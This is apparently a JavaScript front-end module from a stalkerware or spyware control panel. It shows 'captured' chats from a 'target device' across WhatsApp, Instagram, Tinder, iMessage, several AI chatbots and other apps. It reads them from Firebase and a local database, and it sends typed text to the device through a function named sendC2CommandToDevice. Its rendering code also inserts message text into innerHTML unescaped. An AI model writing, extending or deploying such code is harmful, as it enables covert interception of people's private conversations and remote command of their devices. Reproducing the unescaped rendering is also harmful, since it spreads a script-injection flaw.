// social.js - 3-Column Social & AI Chat Engine (100% Real-Time Captured Stream Engine)

const appBrandColors = {
    // 11 Social Messenger Apps
    whatsapp: { bg: "#075E54", bubbleOut: "#056162", icon: "fa-whatsapp", title: "WhatsApp Web" },
    facebook: { bg: "#0084FF", bubbleOut: "#0084FF", icon: "fa-facebook-messenger", title: "Facebook Messenger" },
    instagram: { bg: "#C13584", bubbleOut: "#E1306C", icon: "fa-instagram", title: "Instagram Direct" },
    snapchat: { bg: "#FFFC00", color: "#000", bubbleOut: "#333", icon: "fa-ghost", title: "Snapchat Activity" },
    tinder: { bg: "#FD3A73", bubbleOut: "#FD3A73", icon: "fa-fire", title: "Tinder Messages" },
    tiktok: { bg: "#00F2FE", color: "#000", bubbleOut: "#00F2FE", icon: "fa-tiktok", title: "TikTok Direct Messages" },
    telegram: { bg: "#229ED9", bubbleOut: "#229ED9", icon: "fa-telegram", title: "Telegram Desktop" },
    viber: { bg: "#7360F2", bubbleOut: "#7360F2", icon: "fa-viber", title: "Viber Messenger" },
    discord: { bg: "#5865F2", bubbleOut: "#5865F2", icon: "fa-discord", title: "Discord DMs" },
    line: { bg: "#00B900", bubbleOut: "#00B900", icon: "fa-line", title: "LINE Chat" },
    kik: { bg: "#82BC23", bubbleOut: "#82BC23", icon: "fa-comments", title: "Kik Messenger" },
    imessage: { bg: "#007AFF", bubbleOut: "#007AFF", icon: "fa-comment", title: "iMessage iOS" },

    // 8 AI Chatbot Stream Models
    chatgpt: { bg: "#10A37F", bubbleOut: "#10A37F", icon: "fa-robot", title: "ChatGPT Stream" },
    gemini: { bg: "#1A73E8", bubbleOut: "#1A73E8", icon: "fa-brain", title: "Google Gemini Stream" },
    claude: { bg: "#D97706", bubbleOut: "#D97706", icon: "fa-sparkles", title: "Claude AI Stream" },
    copilot: { bg: "#0284C7", bubbleOut: "#0284C7", icon: "fa-microchip", title: "Microsoft Copilot Stream" },
    deepseek: { bg: "#4F46E5", bubbleOut: "#4F46E5", icon: "fa-lightbulb", title: "DeepSeek-R1 Reasoning Stream" },
    perplexity: { bg: "#059669", bubbleOut: "#059669", icon: "fa-magnifying-glass", title: "Perplexity AI Search Agent" },
    grok: { bg: "#111827", bubbleOut: "#111827", icon: "fa-bolt", title: "xAI Grok 2 Stream" },
    llama: { bg: "#2563EB", bubbleOut: "#2563EB", icon: "fa-layer-group", title: "Meta Llama 3 70B Stream" }
};

// Real-Time Captured Conversations Store (No Static Dummy Data)
const realSocialConversations = {};

let activeSocialAppKey = "whatsapp";
let activeConversationObj = null;

function loadSocialAppConversation(appKey, displayTitle) {
    const key = appKey.toLowerCase().replace(/[^a-z0-9]/g, "");
    activeSocialAppKey = appBrandColors[key] ? key : "whatsapp";

    const brand = appBrandColors[activeSocialAppKey] || appBrandColors["whatsapp"];

    // Update Header Brand
    const headerTitle = document.getElementById("socialHeaderTitle");
    if (headerTitle) {
        headerTitle.innerHTML = `<i class="fa-solid ${brand.icon} me-2" style="color:${brand.bg}"></i> ${brand.title}`;
    }

    if (typeof HomeMonitorAPI !== "undefined" && HomeMonitorAPI && typeof HomeMonitorAPI.chat.getThreads === "function") {
        HomeMonitorAPI.chat.getThreads(activeSocialAppKey)
            .then(data => {
                if (data && data.threads) {
                    handleP2pSocialDatabaseResponse(activeSocialAppKey, data.threads);
                }
            })
            .catch(err => console.warn(`[HomeMonitorAPI Chat Error] ${activeSocialAppKey}:`, err));
    }

    if (typeof queryP2pLocalDatabase === "function") {
        queryP2pLocalDatabase("SOCIAL", activeSocialAppKey);
    }

    subscribeRealtimeFirebaseSocialFeed(activeSocialAppKey);
    renderConversationList(activeSocialAppKey);
}

function handleP2pSocialDatabaseResponse(appKey, messages) {
    if (!messages || !Array.isArray(messages)) return;
    const key = appKey.toLowerCase().replace(/[^a-z0-9]/g, "");

    const list = messages.map(item => ({
        sender: item.sender || "Contact",
        direction: item.direction || "incoming",
        text: item.text || item.text_content || "",
        time: item.time || item.time_str || new Date(item.timestamp || Date.now()).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    }));

    if (!realSocialConversations[key]) realSocialConversations[key] = [];

    let p2pConv = realSocialConversations[key].find(c => c.id === "p2p_sqlite_feed");
    if (!p2pConv) {
        p2pConv = {
            id: "p2p_sqlite_feed",
            name: `📱 ${key.toUpperCase()} Live Captured Feed`,
            avatar: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100",
            lastMessage: list.length > 0 ? list[list.length - 1].text : "P2P live stream active",
            time: "Just Now",
            messages: list
        };
        realSocialConversations[key].unshift(p2pConv);
    } else {
        p2pConv.messages = list;
        p2pConv.lastMessage = list.length > 0 ? list[list.length - 1].text : "";
    }

    renderConversationList(key);
}

function subscribeRealtimeFirebaseSocialFeed(appKey) {
    if (typeof currentUser === "undefined" || !currentUser || !currentUser.uid) return;
    const uid = currentUser.uid;
    const devId = (typeof getActiveRealDeviceId === "function") ? getActiveRealDeviceId() : (activeDeviceId || "");

    if (typeof firebase !== "undefined" && firebase.database) {
        firebase.database().ref(`users/${uid}/devices/${devId}/social/${appKey}`).limitToLast(50).on("value", snapshot => {
            const val = snapshot.val();
            if (val) {
                const list = [];
                Object.keys(val).forEach(msgId => {
                    const item = val[msgId];
                    list.push({
                        sender: item.sender || "Contact",
                        direction: item.direction || "incoming",
                        text: item.text || "",
                        time: item.time || new Date(item.timestamp || Date.now()).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
                    });
                });

                if (!realSocialConversations[appKey]) realSocialConversations[appKey] = [];

                let liveConv = realSocialConversations[appKey].find(c => c.id === "realtime_live_feed");
                if (!liveConv) {
                    liveConv = {
                        id: "realtime_live_feed",
                        name: `📱 ${appKey.toUpperCase()} Captured Feed`,
                        avatar: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100",
                        lastMessage: list.length > 0 ? list[list.length - 1].text : "Live stream active...",
                        time: "Just Now",
                        messages: list
                    };
                    realSocialConversations[appKey].unshift(liveConv);
                } else {
                    liveConv.messages = list;
                    liveConv.lastMessage = list.length > 0 ? list[list.length - 1].text : "";
                }

                renderConversationList(appKey);
            }
        });
    }
}

function renderConversationList(appKey) {
    const listContainer = document.getElementById("socialConvList");
    if (!listContainer) return;

    const conversations = realSocialConversations[appKey] || [];
    listContainer.innerHTML = "";

    if (conversations.length === 0) {
        listContainer.innerHTML = `
            <div class="p-4 text-center text-muted small">
                <i class="fa-solid fa-comments display-6 text-secondary mb-3"></i><br>
                <strong>No chat messages captured yet.</strong><br>
                <span class="extra-small opacity-75">Awaiting live captured feed from target device...</span>
            </div>
        `;
        const timelineContainer = document.getElementById("socialMessageTimeline");
        if (timelineContainer) {
            timelineContainer.innerHTML = `<div class="text-center text-muted small mt-5">Awaiting live chat stream from target device for <strong>${appKey.toUpperCase()}</strong>...</div>`;
        }
        return;
    }

    conversations.forEach((conv, index) => {
        const item = document.createElement("div");
        item.className = `conv-list-item p-3 d-flex align-items-center gap-3 border-bottom border-dark ${index === 0 ? 'active-conv' : ''}`;
        item.style.cursor = "pointer";
        item.innerHTML = `
            <img src="${conv.avatar}" class="rounded-circle" style="width: 44px; height: 44px; object-fit: cover;">
            <div class="flex-grow-1 overflow-hidden">
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <h6 class="mb-0 fw-bold text-light text-truncate">${conv.name}</h6>
                    <small class="text-secondary extra-small">${conv.time}</small>
                </div>
                <p class="mb-0 text-secondary small text-truncate">${conv.lastMessage}</p>
            </div>
        `;
        item.addEventListener("click", function() {
            document.querySelectorAll(".conv-list-item").forEach(i => i.classList.remove("active-conv"));
            this.classList.add("active-conv");
            activeConversationObj = conv;
            renderMessageTimeline(conv);
        });
        listContainer.appendChild(item);
    });

    if (conversations.length > 0) {
        activeConversationObj = conversations[0];
        renderMessageTimeline(conversations[0]);
    }
}

function renderMessageTimeline(conv) {
    const headerName = document.getElementById("activeConvContactName");
    if (headerName) headerName.innerText = conv.name;

    const timelineContainer = document.getElementById("socialMessageTimeline");
    if (!timelineContainer) return;

    timelineContainer.innerHTML = "";

    const brand = appBrandColors[activeSocialAppKey] || appBrandColors["whatsapp"];

    conv.messages.forEach(msg => {
        const row = document.createElement("div");
        row.className = `d-flex mb-3 ${msg.direction === 'outgoing' ? 'justify-content-end' : 'justify-content-start'}`;

        if (msg.direction === 'incoming') {
            row.innerHTML = `
                <img src="${conv.avatar}" class="rounded-circle me-2" style="width: 34px; height: 34px; object-fit: cover;">
                <div class="bubble-incoming p-3 rounded-3 shadow-sm" style="max-width: 72%; background-color: #334155; color: #ffffff;">
                    <div class="fw-bold extra-small text-info mb-1">${conv.name}</div>
                    <p class="mb-1 small">${msg.text}</p>
                    <small class="text-secondary extra-small">${msg.time}</small>
                </div>
            `;
        } else {
            row.innerHTML = `
                <div class="bubble-outgoing p-3 rounded-3 shadow-sm" style="max-width: 72%; background-color: ${brand.bubbleOut}; color: #ffffff;">
                    <div class="fw-bold extra-small text-light mb-1">Me</div>
                    <p class="mb-1 small">${msg.text}</p>
                    <small class="text-light extra-small opacity-75">${msg.time}</small>
                </div>
            `;
        }
        timelineContainer.appendChild(row);
    });

    timelineContainer.scrollTop = timelineContainer.scrollHeight;
}

// Interactive Chat Input Sender
document.getElementById("socialChatForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const input = document.getElementById("socialChatInput");
    const text = input ? input.value.trim() : "";

    if (text) {
        sendC2CommandToDevice(`!say ${text}`);

        if (!realSocialConversations[activeSocialAppKey]) realSocialConversations[activeSocialAppKey] = [];
        if (realSocialConversations[activeSocialAppKey].length === 0) {
            realSocialConversations[activeSocialAppKey].push({
                id: "sent_outbound_chat",
                name: `📱 ${activeSocialAppKey.toUpperCase()} Live Chat`,
                avatar: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100",
                lastMessage: text,
                time: "Just Now",
                messages: []
            });
        }

        const activeConv = realSocialConversations[activeSocialAppKey][0];
        const timeNow = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
        activeConv.messages.push({
            sender: "Me",
            direction: "outgoing",
            text: text,
            time: timeNow
        });
        activeConv.lastMessage = text;
        activeConv.time = timeNow;

        renderConversationList(activeSocialAppKey);
        renderMessageTimeline(activeConv);
        input.value = "";
    }
});
